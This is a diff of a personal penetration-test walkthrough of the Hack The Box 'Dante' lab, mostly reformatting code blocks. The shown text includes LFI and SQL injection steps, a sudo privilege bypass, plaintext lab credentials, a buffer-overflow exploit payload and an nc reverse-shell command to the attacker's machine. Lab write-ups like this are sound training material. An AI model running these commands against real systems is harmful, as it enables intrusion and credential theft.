@@ -1,7 +1,7 @@
 # 📦 HTB | dante
-----
+
 Tags: #📦
-Related to: [[nmap]], [[ftp]], [[wget]], [[wpscan]], [[cewl]], [[ssh]], [[PHP]], [[id]], [[python]], [[stty]], [[bash]], [[gtfobins lolbas]], [[find]], [[su]], [[ifconfig]], [[proxychains4]], [[smbclient]], [[firefox]], [[base64]], [[curl]], [[wget]], [[pspy]], [[03 TOOLS & UTILITIES/file]], [[wireshark]], [[netcat ncat nc]],  [[gobuster]], [[whoami]], [[searchsploit]], [[john]], [[w_type]], [[w_netstat]], [[powershell]], [[w_tasklist]], [[w_findstr]], [[strings]], [[ghidra]], [[w_netsh]], [[Immunity Debugger]], [[pwntools]], [[msfvenom]], [[chisel]], [[du]], [[upx]], [[sum]], [[w_hostname]], [[w_net]], [[SQL]], [[sqlmap]], [[gunzip]], [[peass]]
+Related to: [[gobuster]], [[file]], [[FTP]], [[Immunity Debugger]], [[PHP]], [[SQL]], [[base64]], [[bash]], [[cewl]], [[chisel]], [[curl]], [[du]], [[find]], [[firefox]], [[ghidra]], [[gtfobins lolbas]], [[gunzip]], [[id]], [[ifconfig]], [[john]], [[msfvenom]], [[nc]], [[nmap]], [[peass]], [[powershell]], [[proxychains4]], [[pspy]], [[pwntools]], [[python]], [[searchsploit]], [[smbclient]], [[sqlmap]], [[ssh]], [[strings]], [[stty]], [[su]], [[sum]], [[upx]], [[w_findstr]], [[w_hostname]], [[w_net]], [[w_netsh]], [[w_netstat]], [[w_tasklist]], [[w_type]], [[wget]], [[wget]], [[whoami]], [[wireshark]], [[wpscan]]
 See also: 
 Previous: [[01 HTB/HTB]]
 
@@ -33,7 +33,7 @@ Known active system:
 
 	nmap -A -sC -p0- --min-rate=1000 -Pn 10.10.110.100	// DANTE{Y0u_Cant_G3t_at_m3_br0!}
 
-```shell-session
+```text
 Nmap scan report for 10.10.110.100
 Host is up (0.043s latency).
 Not shown: 65533 filtered tcp ports (no-response)
@@ -77,7 +77,7 @@ Anonymous FTP login:
 
 	cat todo.txt
 	
-```shell-session
+```text
 - Finalize Wordpress permission changes - PENDING
 - Update links to to utilize DNS Name prior to changing to port 80 - PENDING
 - Remove LFI vuln from the other site - PENDING
@@ -89,7 +89,7 @@ robots.txt:
 
 	wget http://10.10.110.100:65000/robots.txt
 
-```shell-session
+```text
 User-agent: Googlebot
 User-agent: AdsBot-Google
 Disallow: /wordpress
@@ -104,7 +104,7 @@ Enumerate vulnerable plugins:
 
 Interesting Finding(s):
 
-```shell-session
+```text
 [+] Headers
  | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
  | Found By: Headers (Passive Detection)
@@ -177,7 +177,7 @@ Enumerate users:
 
 	wpscan --url http://10.10.110.100:65000/wordpress --enumerate u
 
-```shell-session
+```text
 [+] Enumerating Users (via Passive and Aggressive Methods)
  Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
 
@@ -201,7 +201,7 @@ Create potential user list:
 
 	vi names.txt
 
-```shell-session
+```text
 admin
 james
 kevin
@@ -276,7 +276,7 @@ Find SUID files:
 
 	find / -perm -4000 -ls 2>/dev/null
 
-```shell-session
+```text
 /usr/bin/vmware-user-suid-wrapper
 /usr/bin/chfn
 /usr/bin/gpasswd
@@ -293,7 +293,7 @@ Exploit find SUID misconfiguration: [^2]
 
 	ifconfig
 
-```shell-session
+```text
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.16.1.100  netmask 255.255.255.0  broadcast 172.16.1.255
         inet6 fe80::250:56ff:feb9:bcff  prefixlen 64  scopeid 0x20<link>
@@ -308,7 +308,7 @@ Identify live hosts on subnet:
 
 	for i in {1..255} ; do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
 
-```shell-session
+```text
 172.16.1.5
 172.16.1.10
 172.16.1.12
@@ -335,13 +335,13 @@ Add your public key to the target and upgrade to SSH shell:
 
 nmap through proxychains4:
 
-```shell-session
+```text
 Note: nmap SYN scan is not proxy aware and there is limited support for the Nmap --proxies option. Instead, we can use a TCP Connect Scan (-sT), which uses the OS to issue a higher-level connect system call that routes the traffic through the proxy.
 ```
 
 	proxychains nmap 172.16.1.10 -sT -sV -Pn -T5
 
-```shell-session
+```text
 Nmap scan report for 172.16.1.10
 Host is up, received user-set (0.11s latency).
 Scanned at 2021-12-25 16:43:34 EST for 115s
@@ -362,7 +362,7 @@ attempting to access /etc/passwd
 
 	view-source:http://172.16.1.10/nav.php?page=../../../../etc/passwd
 	
-```shell-session
+```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -414,7 +414,7 @@ mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
 ```
 
-```shell-session
+```text
 frank
 margaret
 ```
@@ -427,7 +427,7 @@ Connect to Samba service:
 
 	proxychains smbclient -L \\172.16.1.10	// list services; root:<blankpassword>
 
-```shell-session
+```text
 Enter WORKGROUP\root's password: 
 
         Sharename       Type      Comment
@@ -445,7 +445,7 @@ Connect to share:
 
 	proxychains smbclient \\\\172.16.1.10\\SlackMigration	// root:<blankpassword>
 
-```shell-session
+```text
 smb: \> ls
   .                                   D        0  Mon Apr 12 10:39:41 2021
   ..                                  D        0  Mon Apr 12 10:39:41 2021
@@ -456,7 +456,7 @@ smb: \> get admintasks.txt
 
 	cat admintasks.txt
 
-```shell-session
+```text
 -Remove wordpress install from web root - PENDING
 -Reinstate Slack integration on Ubuntu machine - PENDING
 -Remove old employee accounts - COMPLETE
@@ -485,7 +485,7 @@ Let's try base64 encoding and including wp-config.php using the filter.
 
 	proxychains firefox http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
 
-```shell-session
+```text
 PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJyAnd29yZHByZXNzJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnbWFyZ2FyZXQnICk7DQoNCi8qKiBNeVNRTCBkYXRhYmFzZSBwYXNzd29yZCAqLw0KZGVmaW5lKCAnREJfUEFTU1dPUkQnLCAnV2VsY29tZTEhMkAzIycgKTsNCg0KLyoqIE15U1FMIGhvc3RuYW1lICovDQpkZWZpbmUoICdEQl9IT1NUJywgJ2xvY2FsaG9zdCcgKTsNCg0KLyoqIERhdGFiYXNlIENoYXJzZXQgdG8gdXNlIGluIGNyZWF0aW5nIGRhdGFiYXNlIHRhYmxlcy4gKi8NCmRlZmluZSggJ0RCX0NIQVJTRVQnLCAndXRmOCcgKTsNCg0KLyoqIFRoZSBEYXRhYmFzZSBDb2xsYXRlIHR5cGUuIERvbid0IGNoYW5nZSB0aGlzIGlmIGluIGRvdWJ0LiAqLw0KZGVmaW5lKCAnREJfQ09MTEFURScsICcnICk7DQoNCi8qKiNAKw0KICogQXV0aGVudGljYXRpb24gVW5pcXVlIEtleXMgYW5kIFNhbHRzLg0KICoNCiAqIENoYW5nZSB0aGVzZSB0byBkaWZmZXJlbnQgdW5pcXVlIHBocmFzZXMhDQogKiBZb3UgY2FuIGdlbmVyYXRlIHRoZXNlIHVzaW5nIHRoZSB7QGxpbmsgaHR0cHM6Ly9hcGkud29yZHByZXNzLm9yZy9zZWNyZXQta2V5LzEuMS9zYWx0LyBXb3JkUHJlc3Mub3JnIHNlY3JldC1rZXkgc2VydmljZX0NCiAqIFlvdSBjYW4gY2hhbmdlIHRoZXNlIGF0IGFueSBwb2ludCBpbiB0aW1lIHRvIGludmFsaWRhdGUgYWxsIGV4aXN0aW5nIGNvb2tpZXMuIFRoaXMgd2lsbCBmb3JjZSBhbGwgdXNlcnMgdG8gaGF2ZSB0byBsb2cgaW4gYWdhaW4uDQogKg0KICogQHNpbmNlIDIuNi4wDQogKi8NCmRlZmluZSggJ0FVVEhfS0VZJywgICAgICAgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScgKTsNCmRlZmluZSggJ05PTkNFX0tFWScsICAgICAgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9TQUxUJywgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQoNCi8qKiNALSovDQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqDQogKiBZb3UgY2FuIGhhdmUgbXVsdGlwbGUgaW5zdGFsbGF0aW9ucyBpbiBvbmUgZGF0YWJhc2UgaWYgeW91IGdpdmUgZWFjaA0KICogYSB1bmlxdWUgcHJlZml4LiBPbmx5IG51bWJlcnMsIGxldHRlcnMsIGFuZCB1bmRlcnNjb3JlcyBwbGVhc2UhDQogKi8NCiR0YWJsZV9wcmVmaXggPSAnd3BfJzsNCg0KLyoqDQogKiBGb3IgZGV2ZWxvcGVyczogV29yZFByZXNzIGRlYnVnZ2luZyBtb2RlLg0KICoNCiAqIENoYW5nZSB0aGlzIHRvIHRydWUgdG8gZW5hYmxlIHRoZSBkaXNwbGF5IG9mIG5vdGljZXMgZHVyaW5nIGRldmVsb3BtZW50Lg0KICogSXQgaXMgc3Ryb25nbHkgcmVjb21tZW5kZWQgdGhhdCBwbHVnaW4gYW5kIHRoZW1lIGRldmVsb3BlcnMgdXNlIFdQX0RFQlVHDQogKiBpbiB0aGVpciBkZXZlbG9wbWVudCBlbnZpcm9ubWVudHMuDQogKg0KICogRm9yIGluZm9ybWF0aW9uIG9uIG90aGVyIGNvbnN0YW50cyB0aGF0IGNhbiBiZSB1c2VkIGZvciBkZWJ1Z2dpbmcsDQogKiB2aXNpdCB0aGUgZG9jdW1lbnRhdGlvbi4NCiAqDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyogVGhhdCdzIGFsbCwgc3RvcCBlZGl0aW5nISBIYXBweSBwdWJsaXNoaW5nLiAqLw0KDQovKiogQWJzb2x1dGUgcGF0aCB0byB0aGUgV29yZFByZXNzIGRpcmVjdG9yeS4gKi8NCmlmICggISBkZWZpbmVkKCAnQUJTUEFUSCcgKSApIHsNCglkZWZpbmUoICdBQlNQQVRIJywgX19ESVJfXyAuICcvJyApOw0KfQ0KDQovKiogU2V0cyB1cCBXb3JkUHJlc3MgdmFycyBhbmQgaW5jbHVkZWQgZmlsZXMuICovDQpyZXF1aXJlX29uY2UgQUJTUEFUSCAuICd3cC1zZXR0aW5ncy5waHAnOw0K
 ```
 
@@ -633,7 +633,7 @@ Add public key and upgrade to SSH shell:
 
 	proxychains nmap 172.16.1.17 -sT -sV -Pn -T5
 
-```shell-session
+```text
 Nmap scan report for 172.16.1.17
 Host is up (0.092s latency).
 Not shown: 996 closed tcp ports (conn-refused)
@@ -655,7 +655,7 @@ Connect to Samba service:
 
 	proxychains smbclient -L \\172.16.1.17	// list services; root:<blankpassword>
 
-```shell-session
+```text
 Sharename       Type      Comment
 ---------       ----      -------
 forensics       Disk      
@@ -666,7 +666,7 @@ Connect to share:
 
 	proxychains smbclient \\\\172.16.1.17\\forensics	// <blankpassword>
 	
-```shell-session
+```text
 smb: \> ls
 smb: \> get monitor
 ```
@@ -684,7 +684,7 @@ Right-click on the HTTP POST request packet and click:
 
 	"Follow" => "HTTP Stream".
 
-```shell-session
+```text
 POST /session_login.cgi HTTP/1.1
 Host: 172.16.88.154:10000
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -704,13 +704,13 @@ user=admin&pass=password6543
 
 	proxychains firefox http://172.16.1.17:10000/session_login.cgi	// admin:password6543
 
-```shell-session
+```text
 # Error - Access denied for 172.16.1.100. The host has been blocked because of too many authentication failures.
 ```
 
 Clear the filter, filter for http, and then look at the other POST requests:
 
-```shell-session
+```text
 POST /session_login.cgi HTTP/1.1
 Host: 172.16.88.154:10000
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -1135,7 +1135,7 @@ Verify this:
 
 	net user gerald
 
-```shell-session
+```text
 User name                    gerald
 Full Name                    
 Comment                      
@@ -1168,7 +1168,7 @@ Due to UAC (User Access Control) we're unable to read the flag on the Administra
 	nc -lvnp 9002				// start another listener on local machine
 	C:\python27\python.exe druva.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc.exe 10.10.16.52 9002 -e cmd.exe"
 
-```shell-session
+```text
 C:\WINDOWS\system32>
 ```
 
@@ -1179,7 +1179,7 @@ C:\WINDOWS\system32>
 
 	proxychains nmap -sT -sV -Pn -T5 172.16.1.12
 	
-```shell-session
+```text
 Nmap scan report for 172.16.1.12
 Host is up (0.12s latency).
 Not shown: 995 closed tcp ports (conn-refused)
@@ -1238,13 +1238,13 @@ Enumerate files and folders:
 
 Note:
 
-```shell-session
+```text
 --proxy	// Proxy to use for requests [http(s)://host:port]
 ```
 
 	gobuster dir --proxy socks5://127.0.0.1:1080 --url http://172.16.1.12/ -w /usr/share/wordlists/dirb/common.txt
 
-```shell-session
+```text
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -1281,7 +1281,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 	
 	searchsploit responsive blog    
 	
-```shell-session
+```text
 Responsive Online Blog 1.0 - 'id' SQL Injection	| php/webapps/48615.txt
 ```
 	
@@ -1323,7 +1323,7 @@ Test for SQLi:
 
 	proxychains firefox http://172.16.1.12/blog/category.php?id=2%27	// ' == %27 in hex
 
-```shell-session
+```text
 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
 ```
 
@@ -1331,7 +1331,7 @@ Enumerate databases:
 
 	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 --dbs --batch 
 
-```shell-session
+```text
 available databases [7]:                                                                                            
 [*] blog_admin_db
 [*] flag
@@ -1346,13 +1346,13 @@ Dump data from flag database:
 
 	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D flag --dump
 
-```shell-session
+```text
 -D			// DBMS database to enumerate
 --dump		// Dump DBMS database table entries
 --dump-all	// Dump all DBMS databases tables entries
 ```
 
-```shell-session
+```text
 Database: flag
 Table: flag
 [1 entry]
@@ -1473,11 +1473,11 @@ uid=1000(ben) gid=1000(ben) groups=1000(ben),46(plugdev)
 
 	sudo -l
 
-```shell-session
+```text
 -l	// If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. A longer list format is used if this option is specified multiple times and the security policy supports a verbose output format.
 ```
 
-```shell-session
+```text
 Matching Defaults entries for ben on DANTE-NIX04:
     env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
     XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
@@ -1493,7 +1493,7 @@ Run command as user:
 
 	sudo -u julian /bin/bash	// Welcometomyblog
 
-```shell-session
+```text
 -u	// Run the command as a user other than the default target user (usually root).
 ```
 
@@ -1502,7 +1502,7 @@ Escalate privileges:
 	python3 -m http.server 80	// serve linpeas.sh
 	,/linpeas.sh
 	
-```shell-session
+```text
 [+] Sudo version
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                         
 Sudo version 1.8.27
@@ -1510,7 +1510,7 @@ Sudo version 1.8.27
 
 	searchsploit sudo
 
-```shell-session
+```text
 sudo 1.8.27 - Security Bypass	| linux/local/47502.py
 ```
 
@@ -1519,7 +1519,7 @@ Exploit sudo 1.8.27 vulnerability: [^7]
 	exit					// exit back to ben account
 	sudo -u#-1 /bin/bash	// exploit vulnerability; enter password: Welcometomyblog
 
-```shell-session
+```text
 root@DANTE-NIX04:/#
 ```
 
@@ -1527,7 +1527,7 @@ root@DANTE-NIX04:/#
 
 	cat /etc/passwd
 
-```shell-session
+```text
 julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::	// save to hash.txt
 ```
 
@@ -1537,7 +1537,7 @@ Next box!
 
 	proxychains nmap -sT -sV -Pn -T5 172.16.1.102
 
-```shell-session
+```text
 PORT     STATE SERVICE       VERSION
 80/tcp   open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.5)
 135/tcp  open  msrpc         Microsoft Windows RPC
@@ -1552,7 +1552,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 	searchsploit Online Marriage Registration System
 	
-```shell-session
+```text
 ----------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                     |  Path
 ----------------------------------------------------------------------------------- ---------------------------------
@@ -1594,7 +1594,7 @@ There's a non-standard folder:
 	cd c:\Apps
 	dir
 	
-```shell-session
+```text
 SERVER.EXE
 ```
 
@@ -1602,7 +1602,7 @@ Check for locally running services:
 
 	netstat -nat | findstr LIST
 
-```shell-session
+```text
 TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING       InHost
 ```
 
@@ -1618,7 +1618,7 @@ Let's forward this port to our local machine using plink: [^8]
 	plink.exe -R 4444:127.0.0.1:4444 -l root -P 22 -pw toor 10.10.16.52
 	
 
-```shell-session
+```text
 -R			// [listen-IP:]listen-port:host:portPattern scanning and language processing.
 
 -l user		// connect with specified username
@@ -1628,7 +1628,7 @@ Let's forward this port to our local machine using plink: [^8]
 
 	nc -nv 127.0.0.1 4444
 
-```shell-session
+```text
 (UNKNOWN) [127.0.0.1] 4444 (?) : Connection refused	// I get a connection attempt but it's refused for some reason.
 ```
 
@@ -1647,14 +1647,14 @@ Let's get SERVER.EXE onto our running machine and see if we can extract some cre
 
 	strings server.exe | grep -A3 Access			// "Access" would have been shown from the nc connection
 
-```shell-session
+```text
 -A NUM, --after-context=NUM
               Print NUM lines of trailing context  after  matching  lines.   Places  a  line  containing  a  group
               separator  (--)  between  contiguous groups of matches.  With the -o or --only-matching option, this
               has no effect and a warning is given.
 ```
 
-```shell-session
+```text
 Enter Access Name: 
 Admin
 Access Password: Pattern scanning and language processing.
@@ -1710,7 +1710,7 @@ Test on Windows only:
 	1) run SERVER.EXE in cmd.exe.
 	2) run nc.exe 127.0.0.1 4444 in another cmd.exe.
 
-```shell-session
+```text
 Dante Server 1.0
 Enter Access Name: Admin
 Access Password: P@$$worD
@@ -1723,7 +1723,7 @@ In Windows powershell:
 
 	netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3333 connectaddress=127.0.0.1 connectport=4444 protocol=tcp
 
-```shell-session
+```text
 The command forwards the connection from port 3333 on 0.0.0.0 to port 4444 on localhost, allowing us to access the  service. Let's validate the vulnerability by sending more than 1024 bytes of data in the password field.
 ```
 
@@ -1733,7 +1733,7 @@ Attacking machine:
 	sudo ifconfig eth1 netmask 255.255.255.0
 	nc -nv 10.10.0.2 3333
 
-```shell-session
+```text
 Dante Server 1.0
 Enter Access Name:
 ```
@@ -1751,7 +1751,7 @@ Create the pattern:
 
 	!mona pattern_create 1500
 
-```shell-session
+```text
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4
 
 0BADF00D   [+] Preparing output file 'pattern.txt'
@@ -1764,7 +1764,7 @@ Find pattern offset:
 
 	!mona pattern_offset 33694232
 
-```shell-session
+```text
 0BADF00D   Looking for 2Bi3 in pattern of 500000 bytes
 0BADF00D    - Pattern 2Bi3 (0x33694232) found in cyclic pattern at position 1028
 ```
@@ -1848,7 +1848,7 @@ r.sendline(payload)
 
 	python3 bof_win.py 10.10.0.2 3333	// success
 
-```shell-session
+```text
 EAX 00000010
 ECX 00000002
 EDX 0019F918
@@ -1862,7 +1862,7 @@ EIP 42424242
 
 Now that we have an EIP overwrite, we can use it to jump to an area that we control. Looking at the stack on the bottom-right window, we see the start of our As as we scroll up.
 
-```shell-session
+```text
 0019FD40   41414141  AAAA
 0019FD44   41414141  AAAA
 0019FD48   41414141  AAAA
@@ -1878,7 +1878,7 @@ We can jump to the top of the stack, which is pointed to by ESP. This can be ach
 
 	!mona jmp -r esp
 
-```shell-session
+```text
 0BADF00D   [+] Writing results to jmp.txt
 0BADF00D       - Number of pointers of type 'jmp esp' : 3
 0BADF00D   [+] Results :
@@ -1892,20 +1892,20 @@ We can jump to the top of the stack, which is pointed to by ESP. This can be ach
 
 Let’s make EIP point to the first instruction and take control of program execution. Edit the script and add the address of the JMP ESP instruction.
 
-```shell-session
+```text
 # 0x10476d73 : jmp esp | ascii {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
 payload = "A" * 1028 + "\x73\x6d\x47\x10" + "C" * 500
 ```
 
 Due to little-endian notation, 0x10476d73 is represented as 0x73, 0x6d, 0x47, 0x10. Double-click on this address in the Log window, right-click > Breakpoint > Toggle, or just hit F2 to set a breakpoint.
 
-```shell-session
+```text
 [19:09:04] Breakpoint at server.10476D73
 ```
 
 Restart the server and run the script again. Once the breakpoint is hit, we see that EIP is populated with the address of the JMP ESP instruction.
 
-```shell-session
+```text
 EAX 00000010
 ECX 00000002
 EDX 0019F918
@@ -1919,7 +1919,7 @@ EIP 10476D73 server.10476D73
 
 Hit F7 to single-step through the code. We can see that ESP is pointing to start of the Cs.
 
-```shell-session
+```text
 0019FD53   1043 43          ADC BYTE PTR DS:[EBX+43],AL
 0019FD56   43               INC EBX
 0019FD57   43               INC EBX
@@ -2012,7 +2012,7 @@ Exploit:
 
 	ifconfig
 	
-```shell-session
+```text
 tun0:	10.10.16.52
 ```
 	
@@ -2041,13 +2041,13 @@ Connect to our Kali box over port 8000, and have our box open port 8001:
 
 	./chisel client 10.10.16.52:8000 R:8001:172.16.1.102:80	// 172.16.1.102 is my next target
 	
-```shell-session
+```text
 version `GLIBC_2.32' not found (required by ./chisel)	// we need to recompile chisel for the target system's glibc version
 ```
 
 Download chisel binary from github repository and try again. [^13]
 
-```shell-session
+```text
 2022/01/04 03:34:57 server: Reverse tunnelling enabled
 2022/01/04 03:34:57 server: Fingerprint ijzp8qvdecpfRjsleY2PDGx35/6ZYhsDlsbG1bvKsQY=
 2022/01/04 03:34:57 server: Listening on http://0.0.0.0:8000
@@ -2060,7 +2060,7 @@ Download chisel binary from github repository and try again. [^13]
 2022/01/04 03:35:01 server: session#1: tun: Bound proxies
 ```
 
-```shell-session
+```text
 2022/01/04 00:45:52 client: Connecting to ws://10.10.16.52:8000
 2022/01/04 00:45:54 client: Connected (Latency 49.660241ms)
 ```
@@ -2111,7 +2111,7 @@ Restart our chisel client to open port 6379:
 
 	nmap -sT -sC -sV -p 6379 localhost
 
-```shell-session
+```text
 PORT     STATE SERVICE VERSION
 6379/tcp open  redis   Redis key-value store 4.0.9
 ```
